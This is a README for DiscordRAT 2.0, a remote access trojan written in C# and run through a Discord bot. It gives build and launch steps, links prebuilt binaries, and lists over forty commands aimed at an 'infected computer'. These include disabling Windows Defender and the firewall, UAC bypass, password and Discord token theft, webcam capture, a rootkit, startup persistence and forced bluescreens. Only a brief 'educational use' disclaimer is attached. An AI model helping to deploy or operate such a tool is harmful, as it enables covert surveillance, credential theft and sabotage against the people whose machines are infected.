# DiscordRAT 2.0
Discord Remote Administration Tool fully written in c#.

This is a RAT controlled over Discord with over 40 post exploitation modules.

The output file size also around ~75kb!

## **Disclaimer:**

This tool is for educational use only, the author will not be held responsible for any misuse of this tool.

## **Credits**
The rootkit in the project was made by "bytecode77". The source of the rootkit can be found here: https://github.com/bytecode77/r77-rootkit

## **Setup Guide:**
Download the pre-complied binary's here https://github.com/moom825/Discord-RAT-2.0/releases/tag/2.0

You will first need to register a bot with the Discord developer portal and then add the bot to the Discord server that you want to use to control the bot (make sure the bot has administrator privileges in the Discord server).
Once the bot is created open "builder.exe" and paste the token in, and paste the guild ID of where you invited the bot

Then if the steps above were successful, you can launch the file by executing ```Client-built.exe```. It will create a new channel and post a message on the server with a generated session number.\
Now your bot should be available to use ! 

**Requirements:**\
Windows(x64)

## **Commands**
```
Available commands are :
--> !message = Show a message box displaying your text / Syntax  = "!message example"
--> !shell = Execute a shell command /Syntax  = "!shell whoami"
--> !voice = Make a voice say outloud a custom sentence / Syntax = "!voice test"
--> !admincheck = Check if program has admin privileges
--> !cd = Changes directory
--> !dir = display all items in current dir
--> !download = Download a file from infected computer
--> !upload = Upload file to the infected computer / Syntax = "!upload file.png" (with attachment)
--> !uploadlink = Upload file to the infected computer / Syntax = "!upload link file.png"
--> !delete = deletes a file / Syntax = "!delete / path to / the / file.txt"
--> !write = Type your desired sentence on computer
--> !wallpaper = Change infected computer wallpaper / Syntax = "!wallpaper" (with attachment)
--> !clipboard = Retrieve infected computer clipboard content
--> !idletime = Get the idle time of user's on target computer
--> !currentdir = display the current dir
--> !block = Blocks user's keyboard and mouse / Warning : Admin rights are required
--> !unblock = Unblocks user's keyboard and mouse / Warning : Admin rights are required
--> !screenshot = Get the screenshot of the user's current screen
--> !exit = Exit program
--> !kill = Kill a session or all sessions / Syntax = "!kill session-3" or "!kill all"
--> !uacbypass = attempt to bypass uac to gain admin by using windir and slui
--> !shutdown = shutdown computer
--> !restart = restart computer
--> !logoff = log off current user
--> !bluescreen = BlueScreen PC
--> !datetime = display system date and time
--> !prockill = kill a process by name / syntax = "!kill process"
--> !disabledefender = Disable windows defender(requires admin)
--> !disablefirewall = Disable windows firewall(requires admin)
--> !audio = play a audio file on the target computer / Syntax = "!audio" (with attachment)
--> !critproc = make program a critical process. meaning if its closed the computer will bluescreen(Admin rights are required)
--> !uncritproc = if the process is a critical process it will no longer be a critical process meaning it can be closed without bluescreening(Admin rights are required)
--> !website = open a website on the infected computer / syntax = "!website www.google.com"
--> !disabletaskmgr = disable task manager(Admin rights are required)
--> !enabletaskmgr = enable task manager(if disabled)(Admin rights are required)
--> !startup = add to startup(when computer go on this file starts)
--> !geolocate = Geolocate computer using latitude and longitude of the ip adress with google map / Warning : Geolocating IP adresses is not very precise
--> !listprocess = Get all process's
--> !password = grab all passwords
--> !rootkit = Launch a rootkit (the process will be hidden from taskmgr and you wont be able to see the file)(Admin rights are required)
--> !unrootkit = Remove the rootkit(Admin rights are required)
--> !getcams = Grab the cameras names and their respected selection number
--> !selectcam = Select camera to take a picture out of (default will be camera 1)/ Syntax "!selectcam 1"
--> !webcampic = Take a picture out of the selected webcam
--> !grabtokens = Grab all discord tokens on the current pc
--> !help = This help menu
```

## Donation
### Buy me a coffee!
BTC: bc1qg4zy8w5swc66k9xg29c2x6ennn5cyv2ytlp0a6
